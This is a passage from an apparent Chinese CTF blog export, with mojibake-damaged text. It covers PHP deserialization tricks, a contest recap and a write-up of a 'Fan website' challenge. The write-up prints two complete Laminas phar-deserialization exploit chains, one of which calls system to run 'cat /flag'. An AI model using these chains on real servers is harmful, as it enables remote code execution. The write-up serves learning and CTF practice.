<p>æƒ³å½“ç„¶åœ°æˆ‘ä»¬æƒ³è°ƒç”¨<code>EvilClass.php</code>é‡Œé¢çš„ç±»ï¼Œæ‰€ä»¥è¦<code>include EvilClass.php</code>ï¼Œä½†æ˜¯æ–‡ä»¶é‡Œè¿˜æ˜¯æ²¡æœ‰å®šä¹‰<code>EvilClass</code>ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°ä¸€ä¸ª[phpååºåˆ—çš„å†·çŸ¥è¯†](<a href="https://zhuanlan.zhihu.com/p/405838002">PHPåºåˆ—åŒ–å†·çŸ¥è¯† - çŸ¥ä¹ (zhihu.com)</a>)</p>
<p>æˆ‘ä»¬è¿˜å‘ç°ä¹‹åçš„ifåˆ¤æ–­è¯­å¥ä¸­banæ‰äº†<code>Evil</code>ï¼Œè¿™å°±è¯´æ˜åœ¨åºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²ä¸­ä¸èƒ½å†å‡ºç°<code>EvilClass</code>ï¼Œä¸è¿‡å¯ä»¥ç›´æ¥æ‹¿é‡Œé¢çš„payload</p>
<p>æ‰€ä»¥payload1ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;qwb&quot;;O:9:&quot;EvilClass&quot;:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>â€¦â€¦</p>
<h2 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast __destruct"></a>fast __destruct</h2><p>åœ¨__wakeupå‰è§¦å‘ __destruct</p>
<blockquote>
<p>1ã€å¦‚æœå•ç‹¬æ‰§è¡Œ<code>unserialize</code>å‡½æ•°è¿›è¡Œå¸¸è§„çš„ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆè¢«ååºåˆ—åŒ–åçš„æ•´ä¸ªå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸå°±ä»…é™äºè¿™ä¸ªå‡½æ•°æ‰§è¡Œçš„ç”Ÿå‘½å‘¨æœŸï¼Œå½“è¿™ä¸ªå‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œè¿™ä¸ªç±»å°±æ²¡äº†ï¼Œåœ¨æœ‰ææ„å‡½æ•°çš„æƒ…å†µä¸‹å°±ä¼šæ‰§è¡Œå®ƒã€‚<br>2ã€å¦‚æœååºåˆ—åŒ–å‡½æ•°åºåˆ—åŒ–å‡ºæ¥çš„å¯¹è±¡è¢«èµ‹ç»™äº†ç¨‹åºä¸­çš„å˜é‡ï¼Œé‚£ä¹ˆè¢«ååºåˆ—åŒ–çš„å¯¹è±¡å…¶ç”Ÿå‘½å‘¨æœŸå°±ä¼šå˜é•¿ï¼Œç”±äºå®ƒä¸€ç›´éƒ½å­˜åœ¨äºè¿™ä¸ªå˜é‡å½“ä¸­ï¼Œå½“è¿™ä¸ªå¯¹è±¡è¢«é”€æ¯ï¼Œæ‰ä¼šæ‰§è¡Œå…¶ææ„å‡½æ•°ã€‚</p>
</blockquote>
<p>è€Œæœ‰æ—¶å€™æˆ‘ä»¬å¦‚æœæå‰æ‰§è¡Œ<code>__destruct</code>(ææ„å‡½æ•°)å°±ä¼šç»•è¿‡é¢˜ç›®ä¸­æŸäº›é™åˆ¶,ä»è€Œäº§ç”Ÿåˆ©ç”¨ç‚¹,æ¯”å¦‚å°±å¯ä»¥bypass __wakeup(ä¸è¿‡ä¸phpç‰ˆæœ¬æœ‰å…³)</p>
<p>æå‰è§¦å‘çš„æ–¹æ³•:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å±æ€§ä¸ªæ•°å€¼:</span><br><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;test&quot;;s:2:&quot;ls&quot;;&#125;</span><br><span class="line">å»æ‰åºåˆ—åŒ–å°¾éƒ¨:</span><br><span class="line">O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:2:&quot;ls&quot;;</span><br></pre></td></tr></table></figure>

<p>ä¾‹å­:å¯ä»¥æ˜æ˜¾çœ‹åˆ°var_dumpæ‰§è¡Œçš„é¡ºåºæ˜¯ä¸ä¸€æ ·çš„</p>
<p><img src="https://img-blog.csdnimg.cn/42e9ecc30f99495a84db2910200a26cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/0cf72b36e6914f3fb8b0aeaab0227223.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h2 id="ååºåˆ—åŒ–å‡½æ•°é—­åŒ…"><a href="#ååºåˆ—åŒ–å‡½æ•°é—­åŒ…" class="headerlink" title="ååºåˆ—åŒ–å‡½æ•°é—­åŒ…"></a>ååºåˆ—åŒ–å‡½æ•°é—­åŒ…</h2><p>é—­åŒ…å‡½æ•°ä¹Ÿå°±æ˜¯åŒ¿åå‡½æ•°,è€Œåœ¨å®šä¹‰é—­åŒ…å‡½æ•°çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨å®ä¾‹åŒ–<code>Closure</code>ç±»</p>
<p><img src="https://img-blog.csdnimg.cn/ce5c520a5605423e85df8d87c7e6ba64.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>ä½†æ˜¯ç›´æ¥ç”¨phpè‡ªå¸¦çš„<code>serialize</code>å‡½æ•°å¯¹è¿™ä¸ªç±»è¿›è¡Œåºåˆ—åŒ–çš„æ—¶å€™ä¼šæŠ¥é”™,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å·¥å…·å»å®ç°é—­åŒ…å‡½æ•°çš„åºåˆ—åŒ–</p>
<p><strong>0x01:å®‰è£…</strong></p>
<p><a href="https://github.com/opis/closure">closure</a></p>
<p><img src="https://img-blog.csdnimg.cn/d503d9e6d45e4162a781cab5c86a794f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><strong>0x02:ä½¿ç”¨</strong></p>
<p>ä¹‹åç›´æ¥æµ‹è¯•å§ï¼Œå¯ä»¥å‘ç°é—­åŒ…å‡½æ•°ç›´æ¥ç”¨<code>unserialize</code>ååºåˆ—åŒ–ä¹‹åå’Œ<code>opis\closure\unserialize</code>ååºåˆ—åŒ–çš„æ—¶å€™çš„è¿”å›å€¼æ˜¯ä¸ä¸€æ ·çš„ä½†æ˜¯éƒ½å¯ä»¥ç›´æ¥å½“ä½œå‡½æ•°ä½¿ç”¨ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;vendor/autoload.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$b</span> = opis\<span class="built_in">closure</span>\serialize(<span class="variable">$a</span>);</span><br><span class="line">var_dump(opis\<span class="built_in">closure</span>\serialize(<span class="variable">$a</span>));</span><br><span class="line">var_dump(unserialize(<span class="variable">$b</span>));</span><br><span class="line">unserialize(<span class="variable">$b</span>)();</span><br><span class="line">var_dump(opis\<span class="built_in">closure</span>\unserialize(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//string(198) &quot;C:32:&quot;Opis\Closure\SerializableClosure&quot;:152:&#123;a:5:&#123;s:3:&quot;use&quot;;a:0:&#123;&#125;s:8:&quot;function&quot;;s:29:&quot;function()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;a&quot;;</span></span><br><span class="line"><span class="comment">//&#125;&quot;;s:5:&quot;scope&quot;;N;s:4:&quot;this&quot;;N;s:4:&quot;self&quot;;s:32:&quot;000000000bc714b9000000004a5c0eab&quot;;&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//object(Opis\Closure\SerializableClosure)#2 (5) &#123;</span></span><br><span class="line"><span class="comment">//  [&quot;closure&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  object(Closure)#5 (0) &#123;</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//  [&quot;reflector&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  NULL</span></span><br><span class="line"><span class="comment">//  [&quot;code&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  string(29) &quot;function()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;a&quot;;</span></span><br><span class="line"><span class="comment">//&#125;&quot;</span></span><br><span class="line"><span class="comment">//  [&quot;reference&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  NULL</span></span><br><span class="line"><span class="comment">//  [&quot;scope&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  NULL</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//object(Closure)#7 (0) &#123;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>webç¨‹åºè®¾è®¡-Project</title>
    <url>/2022/05/06/web%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%BE%80%E6%9C%9F%E4%BD%9C%E4%B8%9A%E5%B1%95%E7%A4%BA/</url>
    <content><![CDATA[<p><a href="https://github.com/ameuu/WebHomework">MyProjectSource</a></p>
]]></content>
      <categories>
        <category>ä½œä¸š</category>
      </categories>
      <tags>
        <tag>homework</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¢ç¢å¿µing</title>
    <url>/2022/07/28/%E7%A2%8E%E7%A2%8E%E5%BF%B5ing/</url>
    <content><![CDATA[<blockquote>
<p>ä¸€äº›åœ¨å¤§ä¼šä¸Šçš„å®˜è¯ï¼ˆ</p>
</blockquote>
<p>ä¸Šå‘¨æœ«é¹ç¨‹æ¯ç»“æŸäº†ï¼Œç¬¬ä¸€æ¬¡å»çº¿ä¸‹è¿˜æ˜¯éå¸¸æ¿€åŠ¨çš„ï¼Œè™½ç„¶å¹¶æ²¡æœ‰ä½“éªŒåˆ°AWDï¼ˆï¼ˆï¼ˆ</p>
<p>ä¸‹é¢å°±æ˜¯å…³äºé¹ç¨‹æ¯å†³èµ›ä¸‹æ¥ä¸€ä¸ªwebæ‰‹ä¸‹å°ç»“ï¼š</p>
<p>å¯¹äºWebæ‰‹è€Œè¨€ï¼š</p>
<p>æœ¬æ¬¡é¹ç¨‹æ¯å†³èµ›è™½ç„¶è¯´æ˜¯åŸå¸‚æ”»é˜²ï¼Œå…¶å®å®è´¨ä¸Šè¿˜æ˜¯è§£é¢˜æ¨¡å¼åªä¸è¿‡é¢˜ç›®æ›´æ¥è¿‘äºç°å®åº”ç”¨åœºæ™¯ï¼Œè™½ç„¶åº”è¯¥æ˜¯å¥½å‡ å¹´å‰çš„åº”ç”¨åœºæ™¯äº†ã€‚</p>
<ol>
<li>è¦ç†Ÿæ‚‰sqlæ³¨å…¥ã€æ–‡ä»¶ä¸Šä¼ ç­‰åŸºç¡€æ¼æ´çš„åŸç†</li>
<li>è™½ç„¶å¹³å¸¸åšé¢˜çš„æ—¶å€™ç”¨sqlmapæ˜¯æ²¡æœ‰çµé­‚çš„ï¼Œä½†æ˜¯è¿˜æ˜¯è¦ä¼šç”¨</li>
<li>è¦ä¼šå®¡è®¡ã€‚è¿™æ¬¡çš„é¢˜ç›®å‡ ä¹éƒ½æ˜¯ç”¨phpå†™çš„ï¼Œå¾ˆå¤šéƒ½æ˜¯phpçš„æ¡†æ¶å¹¶ä¸”ç»™äº†æºç ï¼Œæ‰€ä»¥æŸäº›æ¼æ´æ˜¯è¦è‡ªå·±å®¡è®¡å‡ºæ¥çš„</li>
<li>ç†Ÿç»ƒè¿ç”¨å„ç§æ‰«æç«¯å£/ç›®å½•å·¥å…·ã€‚nmapã€å¾¡å‰‘â€¦â€¦</li>
<li>è¦æœ‰å¤§å­—å…¸</li>
<li>æœ€é‡è¦è¿˜æ˜¯å¹³æ—¶çš„ç§¯ç´¯ï¼Œçº¿ä¸‹çš„æ—¶å€™æ˜¯ä¸èƒ½ä¸Šç½‘çš„ï¼Œæ‰€ä»¥é‡åˆ°ä¸€äº›æ¯”è¾ƒæ˜æ˜¾çš„CVEçš„æ—¶å€™ï¼Œå°±æ˜¯è¦çœ‹ä¸ªäººçš„åšé¢˜é‡/å¤ç°æ¼æ´é‡äº† thinkphp6 æ—¥å¿—æ–‡ä»¶åŒ…å«</li>
<li>è¿˜æœ‰å°±æ˜¯å†…ç½‘æ¸—é€äº†ï¼ŒåŸºç¡€çš„ææƒEXPâ€¦â€¦</li>
<li>æœ€åä¸€ç‚¹å°±æ˜¯è„‘æ´å§â€¦â€¦</li>
</ol>
<p>å¯¹äºéWebæ‰‹è€Œè¨€ï¼š</p>
<p>è¿™æ¬¡æ¯”èµ›å¤§éƒ¨åˆ†çš„é¢˜ç›®éƒ½æ˜¯webæ–¹å‘çš„é¢˜ï¼Œæ‰€ä»¥è¿˜æ˜¯å»ºè®®å…¶ä»–æ–¹å‘çš„åŒå­¦åœ¨å­¦æœ‰ä½™åŠ›çš„æ—¶å€™å¯ä»¥å»æ¼æ´é“¶è¡Œã€ctfwikiç­‰ç½‘ç«™ç®€å•å­¦ä¹ ä¸€ä¸‹webæ–¹å‘å¸¸è§çš„æ¼æ´åŸç†</p>
<p>æœ€åï¼š</p>
<p>é™¤äº†ä¸Šé¢ä¸€äº›æ„Ÿå—ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªå°±æ˜¯æ¯”èµ›ä¸­å‡ ä¹æ‰€æœ‰é¢˜ç›®éƒ½ä¼šæ¶‰åŠç™»å½•æ¡†ï¼Œä¸€èˆ¬å°±æ˜¯sqlæ³¨å…¥æˆ–è€…å°±æ˜¯å¼±å£ä»¤äº†â€¦â€¦</p>
]]></content>
      <categories>
        <category>Ameuu</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>çº¢æ˜è°·web</title>
    <url>/2022/03/23/%E7%BA%A2%E6%98%8E%E8%B0%B7web1/</url>
    <content><![CDATA[<h4 id="Fan-website"><a href="#Fan-website" class="headerlink" title="Fan website"></a>Fan website</h4><ul>
<li>æ–‡ä»¶ä¸Šä¼ </li>
<li>phpååºåˆ—åŒ–</li>
<li>laminas cve</li>
</ul>
<p>ç›´æ¥æœ‰<code>www.zip</code>æºç æ³„éœ²ï¼Œç„¶åé¢˜ç›®æ˜¯å…³äº<code>laminas</code>çš„ï¼Œæ‰€ä»¥ç›´æ¥æœç´¢<code>laminas cve</code>ï¼Œå°±å¯ä»¥å‘ç°å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œä½†æ˜¯æˆ‘æ²¡æ‰¾åˆ°ååºåˆ—åŒ–è§¦å‘çš„ç‚¹</p>
<p><img src="https://img-blog.csdnimg.cn/35772c8f358f427d8a67b6e5ce90436e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<span id="more"></span>

<p>ç„¶åå¯ä»¥å‘ç°å­˜åœ¨æ–‡ä»¶ä¸Šä¼ çš„ç‚¹</p>
<p><img src="https://img-blog.csdnimg.cn/48b50cc532b84beba48052dd1193cc2f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>å¹¶ä¸”è¿˜å­˜åœ¨åˆ é™¤æ–‡ä»¶çš„ç‚¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨pharåè®®äº†ï¼Œåœ¨ç™¾åº¦çš„æ—¶å€™å‘ç°pharåè®®åœ¨unlinkå‡½æ•°ä¸­ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œçš„</p>
<p>æ‰€ä»¥ç›´æ¥å¼€å¹²</p>
<p>laminas cveä¹‹å‰æ²¡æœ‰é‡åˆ°è¿‡ï¼Œä½†æ˜¯ç½‘ä¸Šå¾ˆå¤šå¸ˆå‚…éƒ½å†™äº†pocï¼Œå°±ç›´æ¥è·Ÿç€å…¶ä¸­æŸä¸€ä¸ªèµ°äº†</p>
<p>ä½†æ˜¯å†™å®Œexpä¹‹åå‘ç°ï¼Œåœ¨æ–‡ä»¶ä¸Šä¼ çš„æ§åˆ¶å™¨é‡Œé¢å­˜åœ¨è¿‡æ»¤</p>
<p><img src="https://img-blog.csdnimg.cn/78ad9a0005544f2a8503ac5375e50229.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>phpå¯ä»¥ç›´æ¥å»æ‰ï¼Œè€Œåé¢çš„å…³é”®å­—å¯ä»¥åˆ©ç”¨gzipå‹ç¼©ç»•è¿‡ï¼ˆæ„Ÿè°¢å§œå°‘ï¼</p>
<p>ç½‘ä¸Šçš„exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">View</span>\<span class="title">Renderer</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Laminas</span>\<span class="title">Config</span>\<span class="title">Config</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpRenderer</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">1000000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">                <span class="variable">$res</span> .= <span class="string">&#x27;ameuuameuuameuua&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__content = <span class="variable">$res</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__helpers = <span class="keyword">new</span> Config([]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">Config</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Config</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&#x27;shutdown&#x27;</span>=&gt;<span class="string">&#x27;phpinfo&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">Log</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Laminas</span>\<span class="title">View</span>\<span class="title">Renderer</span>\<span class="title">PhpRenderer</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Phar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writers = [<span class="keyword">new</span> PhpRenderer()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Logger();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//.pharæ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&#x27;__HALT_COMPILER();&#x27;</span>); <span class="comment">//å›ºå®šçš„</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ä¸Šä¼ ï¼Œç„¶ååˆ é™¤çš„æ—¶å€™ç”¨pharåè®®</p>
<p><img src="https://img-blog.csdnimg.cn/4055e9aa16ab4d888d24bf8067ce6cbd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><a href="https://xz.aliyun.com/u/16398">Mrkaixin</a>å¸ˆå‚…çš„expï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">View</span>\<span class="title">Resolver</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">TemplateMapResolver</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">map</span> = [&quot;<span class="title">setBody</span>&quot;=&gt;&quot;<span class="title">system</span>&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">View</span>\<span class="title">Renderer</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PhpRenderer</span>&#123;</span><br><span class="line">        <span class="title">function</span> <span class="title">__construct</span>()&#123;</span><br><span class="line">            $<span class="title">res</span> = &#x27;&#x27;;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">1000000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">                <span class="variable">$res</span> .= <span class="string">&#x27;ameuuameuuameuua&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__content = <span class="variable">$res</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__helpers = <span class="keyword">new</span> \Laminas\View\Resolver\TemplateMapResolver();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">Log</span>\<span class="title">Writer</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">AbstractWriter</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Mail</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">eventsToMail</span> = [&quot;<span class="title">cat</span> /<span class="title">flag</span>&quot;];  </span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$subjectPrependText</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$mail</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mail = <span class="keyword">new</span> \Laminas\View\Renderer\PhpRenderer();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">Log</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Logger</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">writers</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writers = [<span class="keyword">new</span> \Laminas\Log\Writer\Mail()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"><span class="title">use</span> <span class="title">Laminas</span>\<span class="title">Log</span>\<span class="title">Logger</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Logger();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;a.phar&quot;</span>); <span class="comment">//.pharæ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&#x27;__HALT_COMPILER();&#x27;</span>); <span class="comment">//å›ºå®šçš„</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/d1d4908d93b342c4816e79541d86024e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h5 id="èµ›åæ€è€ƒ"><a href="#èµ›åæ€è€ƒ" class="headerlink" title="èµ›åæ€è€ƒ"></a>èµ›åæ€è€ƒ</h5><p><del>å› ä¸ºå½“æ—¶æ˜¯ç›´æ¥ç”¨åˆ«çš„å¸ˆå‚…çš„pocæ‰“çš„ï¼Œåªæ˜¯å¤§æ¦‚åœ°èµ°äº†ä¸€éé˜²æ­¢pocä¸ä¸€è‡´ï¼Œæ‰€ä»¥ç°åœ¨å†æ¥ä»”ç»†èµ°ä¸€éï¼Œè¯•ç€èƒ½ä¸èƒ½è‡ªå·±æŒ–å‡ºä¸€æ¡ï¼ˆï¼Ÿ</del></p>
<p><strong>0x01:Logger-destructå¼€å§‹</strong></p>
<p>é¦–å…ˆè¦æ‰¾é“¾å­çš„å…¥å£ï¼Œä¸€èˆ¬ä¼šä»<code>__construct</code>æˆ–è€…<code>__destruct</code>å¼€å§‹ï¼Œè€ŒLoggerç±»é‡Œé¢çš„<code>__destrcut</code>å­˜åœ¨æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å€¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;writers <span class="keyword">as</span> <span class="variable">$writer</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="variable">$writer</span>-&gt;shutdown();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œï¼Œä¼šè°ƒç”¨ä¸€ä¸ª<code>shutdown</code>æ–¹æ³•ï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“å°±èƒ½æƒ³åˆ°å¯èƒ½ä¼šè§¦å‘<code>__call</code>é­”æœ¯æ–¹æ³•ï¼Œç„¶åå¯ä»¥å»å…¨å±€æœç´¢<code>__call</code></p>
<p>å¯ä»¥åœ¨<code>PhpRenderer</code>å‘ç°é™åˆ¶æ¯”è¾ƒå°‘ï¼Œå¹¶ä¸”è¿˜å­˜åœ¨<code>call_user_func_array</code>å‡½æ•°ï¼Œç›´æ¥è·Ÿä¸€ä¸‹</p>
